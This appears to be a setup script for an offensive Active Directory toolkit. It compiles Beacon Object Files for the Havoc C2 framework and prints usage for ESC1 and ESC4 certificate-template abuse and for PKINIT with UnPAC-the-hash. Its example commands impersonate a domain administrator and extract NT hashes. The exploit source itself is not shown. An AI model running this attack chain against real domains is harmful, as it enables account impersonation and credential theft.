#!/bin/bash
#
# SpicyAD-BOF Setup Script for Kali Linux
#
# Usage:
#   1. Copy SpicyAD-BOF folder to /home/kali/
#   2. cd /home/kali/SpicyAD-BOF
#   3. chmod +x setup.sh && ./setup.sh
#

set -e

echo ""
echo "============================================"
echo "  SpicyAD-BOF Build Script"
echo "============================================"
echo ""

# Get script directory
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$SCRIPT_DIR"

echo "[*] Working directory: $SCRIPT_DIR"

# Check for MinGW
if ! command -v x86_64-w64-mingw32-gcc &> /dev/null; then
    echo "[!] MinGW not found. Installing..."
    sudo apt update && sudo apt install -y mingw-w64
fi

# Create output directory
mkdir -p havoc/bofs

# Fix include paths in source files
echo "[*] Fixing include paths..."
sed -i 's|#include "../../include/beacon.h"|#include "beacon.h"|g' src/adcs/*.c 2>/dev/null || true
sed -i 's|#include "../../include/bofdefs.h"|#include "bofdefs.h"|g' src/adcs/*.c 2>/dev/null || true

# Compile ESC1 BOF (v3 - with SID for Strong Certificate Mapping KB5014754)
echo ""
echo "[*] Compiling ESC1 BOF v3 (UPN + SID for Strong Cert Mapping)..."
if x86_64-w64-mingw32-gcc -c -o havoc/bofs/esc1.x64.o src/adcs/esc1_v3.c -I include -DBOF -Wall -O2 2>&1; then
    echo "[+] esc1.x64.o compiled successfully"
else
    echo "[!] Failed to compile esc1.x64.o"
fi

# Compile ESC1_FULL BOF (PKINIT + UnPAC-the-hash)
echo ""
echo "[*] Compiling ESC1_FULL BOF (PKINIT + UnPAC-the-hash)..."
if x86_64-w64-mingw32-gcc -c -o havoc/bofs/esc1_full.x64.o src/adcs/esc1_full.c -I include -DBOF -Wall -O2 2>&1; then
    echo "[+] esc1_full.x64.o compiled successfully"
else
    echo "[!] Failed to compile esc1_full.x64.o"
fi

# Compile ESC4 BOF
echo ""
echo "[*] Compiling ESC4 BOF (template modification)..."
if x86_64-w64-mingw32-gcc -c -o havoc/bofs/esc4.x64.o src/adcs/esc4.c -I include -DBOF -Wall -O2 2>&1; then
    echo "[+] esc4.x64.o compiled successfully"
else
    echo "[!] Failed to compile esc4.x64.o"
fi

# Compile ESC1_UNPAC BOF (complete chain: ESC1 + PKINIT + UnPAC)
echo ""
echo "[*] Compiling ESC1_UNPAC BOF (complete attack chain)..."
if x86_64-w64-mingw32-gcc -c -o havoc/bofs/esc1_unpac.x64.o src/adcs/esc1_unpac.c -I include -DBOF -Wall -O2 2>&1; then
    echo "[+] esc1_unpac.x64.o compiled successfully"
else
    echo "[!] Failed to compile esc1_unpac.x64.o"
fi

echo ""
echo "============================================"
echo "  Build Complete!"
echo "============================================"
echo ""
echo "Compiled BOFs:"
ls -la havoc/bofs/*.o 2>/dev/null || echo "  (none found)"
echo ""
echo "============================================"
echo "  How to load in Havoc C2:"
echo "============================================"
echo ""
echo "1. In Havoc Client: Scripts -> Load Script"
echo "2. Navigate to: $SCRIPT_DIR/havoc/spicyad.py"
echo "3. Click Open"
echo ""
echo "============================================"
echo "  Available Commands:"
echo "============================================"
echo ""
echo "  spicyad-esc1 <CA> <Template> <TargetUPN>"
echo "    Request certificate with custom SAN to impersonate user"
echo "    Example: spicyad-esc1 DC01\\CA ESC1-Vuln administrator@domain.local"
echo ""
echo "  spicyad-esc4 <Template> [restore]"
echo "    Modify template to make it ESC1-vulnerable"
echo "    Example: spicyad-esc4 WebServer"
echo "    Restore:  spicyad-esc4 WebServer restore"
echo ""
echo "  spicyad-pkinit <PFX_Base64> [Password] [User@Domain] [KDC]"
echo "    PKINIT auth + UnPAC-the-hash to get NT hash"
echo "    Accepts base64-encoded PFX directly from spicyad-esc1!"
echo "    Example: spicyad-pkinit MIIQ... \"\" administrator@domain.local DC01"
echo ""
echo "  spicyad-esc1unpac <CA> <Template> <UPN> [KDC] [nosid]"
echo "    Complete attack chain: ESC1 -> PKINIT -> UnPAC-the-hash"
echo "    All in one command - request cert and get NT hash!"
echo "    Example: spicyad-esc1unpac DC01\\CA ESC1 administrator@domain.local"
echo "    With KDC: spicyad-esc1unpac DC01\\CA ESC1 admin@dom.local DC01.dom.local"
echo ""
